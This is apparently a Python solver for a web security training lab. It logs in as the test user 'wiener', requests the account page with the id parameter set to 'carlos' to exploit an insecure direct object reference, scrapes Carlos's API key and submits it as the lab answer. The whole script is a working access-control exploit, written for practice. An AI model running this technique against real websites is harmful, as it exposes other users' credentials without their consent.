#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if token:
        return token["value"]
    return None

def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf
    r = s.post(login_page, data=data, verify=False, allow_redirects=False, proxies=proxies, timeout=10)
    if r.status_code == 302:
        return True
    return False

def get_carlos_api_key(s, url):
    carlos_url = url + "/my-account?id=carlos"
    r = s.get(carlos_url, verify=False, proxies=proxies, allow_redirects=False)
    if "carlos" in r.text:
        print("[*] Retrieving Carlos' API key...")
    soup = BeautifulSoup(r.text, "html.parser")
    apikey = soup.find(string=re.compile("Your API Key is")).split(": ")[1]
    print(f"[+] Carlos' API key is: {apikey}")
    apikey = apikey.strip()
    if "API Key" in r.text:
        return apikey
    return False 

def submit_answer(s, url):
    key = get_carlos_api_key(s, url)
    print("[*] Submitting answer...")
    submit_url = url + "/submitSolution"
    data = {"answer": key}
    r = s.post(submit_url, data=data, verify=False, allow_redirects=True)
    if "true" in r.text:
        return True
    return False         

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url, "wiener", "peter"):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    if  not submit_answer(s, url):
        print("[+] Error submitting answer")
        return
    print("[+] Lab solved")     

if __name__ == "__main__":
    main()    